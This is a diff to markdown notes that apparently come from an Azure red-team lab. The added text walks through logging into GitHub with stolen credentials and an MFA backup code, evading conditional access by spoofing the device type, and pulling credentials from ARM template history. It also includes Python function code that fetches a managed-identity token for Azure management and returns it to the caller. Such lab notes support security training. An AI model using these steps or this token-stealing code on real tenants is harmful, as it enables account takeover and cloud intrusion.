@@ -65,6 +65,8 @@ Privilege Escalation and Lateral Movement
   - [Enumerate service principal type]
   - [Use Managed Identity of function app Client Secret]
   - [Deployment Template - creds]
+- FunctionApp?
+  - Github and Authenticator
 * * *
 # Enumeration 
 TLDR:
@@ -1050,13 +1052,29 @@ Sign out and sign in with a different account
 ```
 Conditional access policy == Toxic relationship. It is upset but doesnt tell you why
 
-## Functional apps
-Using the creds we [got] for Github lets login
-creds work but we need mfa... dont worry we have the backup too!
-
-
 
 
 - Press F12 and choose another device type lol > iPad Pro
 - Now within the Portal goto ```Resources> Resource Groups> StagingEnv> Settings> Deployments> Template```
+- Grab the creds within the ARM Template development history
+
+## Function Apps
+Using the creds we [got] for Github lets login - goto ```https://github.com/DefCorp/SimpleApps```
+creds work but we need mfa... dont worry we have the backup too - put it into google authenticator extension for chrome
+
+
+now go into student folder > ```__init__.py``` and replace with the contents of the ```run.py``` file we stole from the unsecured storage blob earlier:
+```
+import logging, os
+import azure.functions as func
+
+def main(req: func.HttpRequest) -> func.HttpResponse:
+	logging.info('Python HTTP trigger function processed a request.')
+	IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
+	IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
+	cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+	val = os.popen(cmd).read()
+	return func.HttpResponse(val, status_code=200)
+```
+
 
